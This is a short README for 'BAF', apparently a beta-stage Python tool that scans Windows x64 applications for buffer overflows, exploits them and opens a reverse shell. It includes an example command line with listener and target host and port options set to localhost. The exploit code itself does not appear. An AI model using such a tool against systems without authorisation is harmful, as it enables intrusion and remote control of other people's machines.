# BAF

Python Buffer Overflow scanner.

## Description

BAF is a tool used to scan winx64 applications for Buffer Overflow Vulnerabilities. It's able to fuzz and exploit vulnerable applications and create a reverse shell.
 
*Note: It's still in beta phase, so there is still stuff in developerment*

## Getting Started

### Executing program

```
python3 main.py
```

### Examples:
```
python3 main.py --lhost 127.0.0.1 --lport 1337 --rhost 127.0.0.1 --rport 2337 --prefix="OVERFLOW_COMMAND" --timeout=5 --littleEndian
```

## Help

```
python3 main.py -h
```

## Authors

Tralse

## Version History

* 0.0
    * Beta phase

## License

This project is licensed under the GNU General Public License v3.0 (GNU GPLv3 License)

## TODOs
- offline scanner
- multi-threading
- save data to not restart all scans
- nice, unique banner :)
- -o flag (for output > file -> logger/logging_file)
